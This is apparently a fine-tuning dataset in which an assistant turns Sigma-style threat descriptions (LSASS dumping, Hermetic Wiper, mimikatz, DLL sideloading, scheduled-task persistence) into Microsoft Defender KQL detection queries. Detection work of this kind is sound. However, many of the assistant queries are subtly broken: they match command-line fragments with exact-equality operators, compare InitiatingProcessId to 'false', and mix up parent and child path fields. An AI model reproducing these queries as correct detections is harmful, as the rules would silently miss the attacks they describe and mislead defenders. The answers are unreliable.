{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The Devtoolslauncher.exe executes other binary Topic: proc_creation_win_lolbin_devtoolslauncher"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"LaunchForDeploy\" and InitiatingProcessFolderPath =~ \"\\\\devtoolslauncher.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location Topic: image_load_side_load_gup_libcurl"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\libcurl.dll\" and InitiatingProcessFolderPath =~ \"\\\\gup.exe\") and (not(InitiatingProcessFolderPath =~ \"\\\\Notepad++\\\\updater\\\\GUP.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"SET\" internal command of Cmd.EXE with the /p flag followed directly by an \"=\" sign.\nAttackers used this technique along with an append redirection operator \">>\" in order to update the content of a file indirectly.\nEx: cmd /c >> example.txt set /p=\"test data\". This will append \"test data\" to contents of \"example.txt\".\nThe typical use case of the \"set /p=\" command is to prompt the user for input.\n Topic: proc_creation_win_cmd_set_prompt_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/c set /p=\", \"\\\"set /p=\") or (ProcessCommandLine contains \">>\" and ProcessCommandLine contains \"set /p=\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges Topic: proc_creation_win_schtasks_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\" /change \", \" /create \")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and ProcessCommandLine =~ \"/ru \" and (ProcessCommandLine in~ (\"NT AUT\", \" SYSTEM \"))) and (not(((ProcessCommandLine in~ (\"/Create /F /RU System /SC WEEKLY /TN AviraSystemSpeedupVerify /TR \", \":\\\\Program Files (x86)\\\\Avira\\\\System Speedup\\\\setup\\\\avira_speedup_setup.exe\", \"/VERIFY /VERYSILENT /NOSTART /NODOTNET /NORESTART\\\" /RL HIGHEST\")) or ((ProcessCommandLine in~ (\"/TN TVInstallRestore\", \"\\\\TeamViewer_.exe\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files created by mimikatz such as \".kirbi\", \"mimilsa.log\", etc. Topic: file_event_win_hktl_mimikatz_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".kirbi\", \"mimilsa.log\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a potentially suspicious execution of a process located in the /tmp/ folder Topic: proc_creation_lnx_susp_execution_tmp_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/tmp/\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths Topic: proc_creation_win_susp_service_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"New-Service\", \"-BinaryPathName\")) or ((ProcessCommandLine in~ (\"create\", \"binPath=\")) and InitiatingProcessFolderPath =~ \"\\\\sc.exe\")) and (ProcessCommandLine in~ (\"powershell\", \"mshta\", \"wscript\", \"cscript\", \"svchost\", \"dllhost\", \"cmd \", \"cmd.exe /c\", \"cmd.exe /k\", \"cmd.exe /r\", \"rundll32\", \"C:\\\\Users\\\\Public\", \"\\\\Downloads\\\\\", \"\\\\Desktop\\\\\", \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\", \"C:\\\\Windows\\\\TEMP\\\\\", \"\\\\AppData\\\\Local\\\\Temp\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state Topic: proc_creation_win_vmware_toolbox_cmd_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" script \", \" set \")) and (FolderPath endswith \"\\\\VMwareToolBoxCmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"toolbox-cmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of a prefetch file which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_prefetch"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".pf\" and (not(((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and InitiatingProcessFolderPath =~ \":\\\\windows\\\\system32\\\\svchost.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the PowerShell execution policy registry key in order to bypass signing requirements for script execution from the CommandLine Topic: proc_creation_win_registry_set_unsecure_powershell_policy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\ShellIds\\\\Microsoft.PowerShell\\\\ExecutionPolicy\", \"\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ExecutionPolicy\")) and (ProcessCommandLine in~ (\"Bypass\", \"RemoteSigned\", \"Unrestricted\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process execution patterns found in intrusions related to the Hermetic Wiper malware attacks against Ukraine in February 2022 Topic: proc_creation_win_malware_hermetic_wiper_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\policydefinitions\\\\postgresql.exe\" or ((ProcessCommandLine contains \"CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp\" or ProcessCommandLine contains \" 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__16\") or (ProcessCommandLine contains \"powershell -c \" and ProcessCommandLine contains \"\\\\comsvcs.dll MiniDump \" and ProcessCommandLine contains \"\\\\winupd.log full\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects audio capture via PowerShell Cmdlet. Topic: proc_creation_win_powershell_audio_capture"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"WindowsAudioDevice-Powershell-Cmdlet\", \"Toggle-AudioDevice\", \"Get-AudioDevice \", \"Set-AudioDevice \", \"Write-AudioDevice \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a privilege elevation attempt by coercing NTLM authentication on the Printer Spooler service Topic: proc_creation_win_rundll32_ntlmrelay"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"spoolss\", \"srvsvc\", \"/print/pipe/\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"storage\" flag in order to retrieve information about the storage status and other related information. Seen used by malware such as DarkSide and LockBit. Topic: proc_creation_lnx_esxcli_storage_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" get\", \" list\")) and (ProcessCommandLine =~ \"storage\" and InitiatingProcessFolderPath =~ \"/esxcli\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of binaries located in potentially suspicious locations via \"nohup\" Topic: proc_creation_lnx_nohup_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/tmp/\" and InitiatingProcessFolderPath =~ \"/nohup\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process.\nThis way we are also able to catch cases in which the attacker has renamed the procdump executable.\n Topic: proc_creation_win_sysinternals_procdump_lsass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -ma \" or ProcessCommandLine contains \" /ma \" or ProcessCommandLine contains \" \u2013ma \" or ProcessCommandLine contains \" \u2014ma \" or ProcessCommandLine contains \" \u2015ma \") and ProcessCommandLine =~ \" ls\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web) Topic: proc_creation_win_susp_archiver_iso_phishing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\Winrar.exe\", \"\\\\7zFM.exe\", \"\\\\peazip.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\isoburn.exe\", \"\\\\PowerISO.exe\", \"\\\\ImgBurn.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function Topic: proc_creation_win_rundll32_advpack_obfuscated_ordinal_call"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"advpack\" and ((ProcessCommandLine contains \"#+\" and ProcessCommandLine contains \"12\") or ProcessCommandLine contains \"#-\") and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\" or ProcessCommandLine contains \"rundll32\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects any assembly DLL being loaded by an Office Product Topic: image_load_office_dotnet_assembly_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath startswith \"C:\\\\Windows\\\\assembly\\\\\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific export function name used by one of EquationGroup tools Topic: proc_creation_win_apt_equationgroup_dll_u_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \"-export dll_u\" or (ProcessCommandLine endswith \",dll_u\" or ProcessCommandLine endswith \" dll_u\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects binaries that use the same name as legitimate sysinternals tools to evade detection Topic: proc_creation_win_sysinternals_tools_masquerading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\accesschk.exe\", \"\\\\accesschk64.exe\", \"\\\\AccessEnum.exe\", \"\\\\ADExplorer.exe\", \"\\\\ADExplorer64.exe\", \"\\\\ADInsight.exe\", \"\\\\ADInsight64.exe\", \"\\\\adrestore.exe\", \"\\\\adrestore64.exe\", \"\\\\Autologon.exe\", \"\\\\Autologon64.exe\", \"\\\\Autoruns.exe\", \"\\\\Autoruns64.exe\", \"\\\\autorunsc.exe\", \"\\\\autorunsc64.exe\", \"\\\\Bginfo.exe\", \"\\\\Bginfo64.exe\", \"\\\\Cacheset.exe\", \"\\\\Cacheset64.exe\", \"\\\\Clockres.exe\", \"\\\\Clockres64.exe\", \"\\\\Contig.exe\", \"\\\\Contig64.exe\", \"\\\\Coreinfo.exe\", \"\\\\Coreinfo64.exe\", \"\\\\CPUSTRES.EXE\", \"\\\\CPUSTRES64.EXE\", \"\\\\ctrl2cap.exe\", \"\\\\Dbgview.exe\", \"\\\\dbgview64.exe\", \"\\\\Desktops.exe\", \"\\\\Desktops64.exe\", \"\\\\disk2vhd.exe\", \"\\\\disk2vhd64.exe\", \"\\\\diskext.exe\", \"\\\\diskext64.exe\", \"\\\\Diskmon.exe\", \"\\\\Diskmon64.exe\", \"\\\\DiskView.exe\", \"\\\\DiskView64.exe\", \"\\\\du.exe\", \"\\\\du64.exe\", \"\\\\efsdump.exe\", \"\\\\FindLinks.exe\", \"\\\\FindLinks64.exe\", \"\\\\handle.exe\", \"\\\\handle64.exe\", \"\\\\hex2dec.exe\", \"\\\\hex2dec64.exe\", \"\\\\junction.exe\", \"\\\\junction64.exe\", \"\\\\ldmdump.exe\", \"\\\\listdlls.exe\", \"\\\\listdlls64.exe\", \"\\\\livekd.exe\", \"\\\\livekd64.exe\", \"\\\\loadOrd.exe\", \"\\\\loadOrd64.exe\", \"\\\\loadOrdC.exe\", \"\\\\loadOrdC64.exe\", \"\\\\logonsessions.exe\", \"\\\\logonsessions64.exe\", \"\\\\movefile.exe\", \"\\\\movefile64.exe\", \"\\\\notmyfault.exe\", \"\\\\notmyfault64.exe\", \"\\\\notmyfaultc.exe\", \"\\\\notmyfaultc64.exe\", \"\\\\ntfsinfo.exe\", \"\\\\ntfsinfo64.exe\", \"\\\\pendmoves.exe\", \"\\\\pendmoves64.exe\", \"\\\\pipelist.exe\", \"\\\\pipelist64.exe\", \"\\\\portmon.exe\", \"\\\\procdump.exe\", \"\\\\procdump64.exe\", \"\\\\procexp.exe\", \"\\\\procexp64.exe\", \"\\\\Procmon.exe\", \"\\\\Procmon64.exe\", \"\\\\psExec.exe\", \"\\\\psExec64.exe\", \"\\\\psfile.exe\", \"\\\\psfile64.exe\", \"\\\\psGetsid.exe\", \"\\\\psGetsid64.exe\", \"\\\\psInfo.exe\", \"\\\\psInfo64.exe\", \"\\\\pskill.exe\", \"\\\\pskill64.exe\", \"\\\\pslist.exe\", \"\\\\pslist64.exe\", \"\\\\psLoggedon.exe\", \"\\\\psLoggedon64.exe\", \"\\\\psloglist.exe\", \"\\\\psloglist64.exe\", \"\\\\pspasswd.exe\", \"\\\\pspasswd64.exe\", \"\\\\psping.exe\", \"\\\\psping64.exe\", \"\\\\psService.exe\", \"\\\\psService64.exe\", \"\\\\psshutdown.exe\", \"\\\\psshutdown64.exe\", \"\\\\pssuspend.exe\", \"\\\\pssuspend64.exe\", \"\\\\RAMMap.exe\", \"\\\\RDCMan.exe\", \"\\\\RegDelNull.exe\", \"\\\\RegDelNull64.exe\", \"\\\\regjump.exe\", \"\\\\ru.exe\", \"\\\\ru64.exe\", \"\\\\sdelete.exe\", \"\\\\sdelete64.exe\", \"\\\\ShareEnum.exe\", \"\\\\ShareEnum64.exe\", \"\\\\shellRunas.exe\", \"\\\\sigcheck.exe\", \"\\\\sigcheck64.exe\", \"\\\\streams.exe\", \"\\\\streams64.exe\", \"\\\\strings.exe\", \"\\\\strings64.exe\", \"\\\\sync.exe\", \"\\\\sync64.exe\", \"\\\\Sysmon.exe\", \"\\\\Sysmon64.exe\", \"\\\\tcpvcon.exe\", \"\\\\tcpvcon64.exe\", \"\\\\tcpview.exe\", \"\\\\tcpview64.exe\", \"\\\\Testlimit.exe\", \"\\\\Testlimit64.exe\", \"\\\\vmmap.exe\", \"\\\\vmmap64.exe\", \"\\\\Volumeid.exe\", \"\\\\Volumeid64.exe\", \"\\\\whois.exe\", \"\\\\whois64.exe\", \"\\\\Winobj.exe\", \"\\\\Winobj64.exe\", \"\\\\ZoomIt.exe\", \"\\\\ZoomIt64.exe\")) and (not((isnull(ProcessVersionInfoCompanyName) or (ProcessVersionInfoCompanyName in~ (\"Sysinternals - www.sysinternals.com\", \"Sysinternals\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a share is mounted using the \"net.exe\" utility Topic: proc_creation_win_net_use_mount_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" use \", \" \\\\\\\\\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects incoming connections to AnyDesk. This could indicate a potential remote attacker trying to connect to a listening instance of AnyDesk and use it as potential command and control channel.\n Topic: net_connection_win_remote_access_tools_anydesk_incoming_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"false\" and InitiatingProcessFolderPath =~ \"\\\\AnyDesk.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious call to the user32.dll function that locks the user workstation Topic: proc_creation_win_rundll32_user32_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"user32.dll,\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and InitiatingProcessFileName =~ \"\\\\cmd.exe\" and ProcessCommandLine =~ \"LockWorkStation\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware Topic: proc_creation_win_netsh_fw_allow_rdp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"portopening\", \"allow\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line patterns associated with the use of Pnscan for sending and receiving binary data across the network.\nThis behavior has been identified in a Linux malware campaign targeting Docker, Apache Hadoop, Redis, and Confluence and was previously used by the threat actor known as TeamTNT\n Topic: proc_creation_lnx_pnscan_binary_cli_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"-(W|R)\\\\s?(\\\\s|\"|')([0-9a-fA-F]{2}\\\\s?){2,20}(\\\\s|\"|')\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific process creation patterns as seen used by UNC2452 and provided by Microsoft as Microsoft Defender ATP queries Topic: proc_creation_win_apt_unc2452_cmds"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".zip\", \".txt\")) or (ProcessCommandLine in~ (\".zip\", \".log\")) or ((InitiatingProcessCommandLine in~ (\"wscript.exe\", \".vbs\")) and (ProcessCommandLine in~ (\"rundll32.exe\", \"C:\\\\Windows\", \".dll,Tk_\"))) or ((InitiatingProcessCommandLine in~ (\"C:\\\\Windows\", \".dll\")) and InitiatingProcessFileName =~ \"\\\\rundll32.exe\" and ProcessCommandLine =~ \"cmd.exe /C \") or (ProcessCommandLine =~ \"\" and InitiatingProcessFileName =~ \"\\\\rundll32.exe\" and InitiatingProcessFolderPath =~ \"\\\\dllhost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189 Topic: proc_creation_win_exploit_cve_2020_10189"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"DesktopCentral_Server\\\\jre\\\\bin\\\\java.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\bitsadmin.exe\", \"\\\\systeminfo.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\reg.exe\", \"\\\\query.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the export of the target Registry key to a file. Topic: proc_creation_win_regedit_export_keys"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \" -E \" or ProcessCommandLine contains \" /E \" or ProcessCommandLine contains \" \u2013E \" or ProcessCommandLine contains \" \u2014E \" or ProcessCommandLine contains \" \u2015E \") and (FolderPath endswith \"\\\\regedit.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGEDIT.EXE\")) and (not(((ProcessCommandLine in~ (\"hklm\", \"hkey_local_machine\")) and (ProcessCommandLine endswith \"\\\\system\" or ProcessCommandLine endswith \"\\\\sam\" or ProcessCommandLine endswith \"\\\\security\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local Topic: proc_creation_win_schtasks_appdata_local_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"NT AUT\", \" SYSTEM \")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (not(((InitiatingProcessFileName in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"TeamViewer_.exe\")) and ProcessCommandLine =~ \"/TN TVInstallRestore\" and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a scheduled task with a GUID like name Topic: proc_creation_win_schtasks_guid_task_name"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"}\\\"\", \"}'\", \"} \")) and (ProcessCommandLine =~ \"/Create \" and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (ProcessCommandLine in~ (\"/TN \\\"{\", \"/TN '{\", \"/TN {\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Alerts on trust record modification within the registry, indicating usage of macros Topic: registry_event_office_trust_record_modification"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Security\\\\Trusted Documents\\\\TrustRecords\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of Microsoft bash launcher without any flags to execute the content of a bash script directly.\nThis can be used to potentially bypass defenses and execute Linux or Windows-based binaries directly via bash.\n Topic: proc_creation_win_bash_file_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \":\\\\Windows\\\\System32\\\\bash.exe\" or FolderPath endswith \":\\\\Windows\\\\SysWOW64\\\\bash.exe\") or ProcessVersionInfoOriginalFileName =~ \"Bash.exe\") and (not(((ProcessCommandLine in~ (\"bash.exe -\", \"bash -\")) or ProcessCommandLine =~ \"\" or isnull(ProcessCommandLine) or (ProcessCommandLine in~ (\"bash.exe\", \"bash\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded Topic: proc_creation_lnx_base64_shebang_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"IyEvYmluL2Jhc2\", \"IyEvYmluL2Rhc2\", \"IyEvYmluL3pza\", \"IyEvYmluL2Zpc2\", \"IyEvYmluL3No\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with attachment manager settings policies associations to lower the default file type risks (See reference for more information) Topic: registry_set_policies_associations_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Associations*\" and ((RegistryKey endswith \"\\\\DefaultFileTypeRisk\" and RegistryValueData =~ \"DWORD (0x00006152)\") or (RegistryKey endswith \"\\\\LowRiskFileTypes\" and (RegistryValueData contains \".zip;\" or RegistryValueData contains \".rar;\" or RegistryValueData contains \".exe;\" or RegistryValueData contains \".bat;\" or RegistryValueData contains \".com;\" or RegistryValueData contains \".cmd;\" or RegistryValueData contains \".reg;\" or RegistryValueData contains \".msi;\" or RegistryValueData contains \".htm;\" or RegistryValueData contains \".html;\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Microsoft Excel loading an Add-In (.xll) file Topic: image_load_office_excel_xll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \".xll\" and InitiatingProcessFolderPath =~ \"\\\\excel.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new office macro files on the systems via an application (browser, mail client). Topic: file_event_win_office_macro_files_downloaded"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FolderPath endswith \".docm\" or FolderPath endswith \".dotm\" or FolderPath endswith \".xlsm\" or FolderPath endswith \".xltm\" or FolderPath endswith \".potm\" or FolderPath endswith \".pptm\") or (FolderPath contains \".docm:Zone\" or FolderPath contains \".dotm:Zone\" or FolderPath contains \".xlsm:Zone\" or FolderPath contains \".xltm:Zone\" or FolderPath contains \".potm:Zone\" or FolderPath contains \".pptm:Zone\")) and (InitiatingProcessFolderPath in~ (\"\\\\RuntimeBroker.exe\", \"\\\\outlook.exe\", \"\\\\thunderbird.exe\", \"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\firefox.exe\", \"\\\\iexplore.exe\", \"\\\\maxthon.exe\", \"\\\\MicrosoftEdge.exe\", \"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\", \"\\\\opera.exe\", \"\\\\safari.exe\", \"\\\\seamonkey.exe\", \"\\\\vivaldi.exe\", \"\\\\whale.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of schtasks with the delete flag and the asterisk symbol to delete all tasks from the schedule of the local computer, including tasks scheduled by other users. Topic: proc_creation_win_schtasks_delete_all"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /delete \", \"/tn *\", \" /f\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL side loading of DLLs that are part of the Wazuh security platform Topic: image_load_side_load_wazuh"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\libwazuhshared.dll\" or FolderPath endswith \"\\\\libwinpthread-1.dll\") and (not((FolderPath startswith \"C:\\\\Program Files\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\\"))) and (not(((FolderPath contains \"\\\\AppData\\\\Local\\\\\" or FolderPath contains \"\\\\ProgramData\\\\\") and FolderPath endswith \"\\\\mingw64\\\\bin\\\\libwinpthread-1.dll\")))"}]}
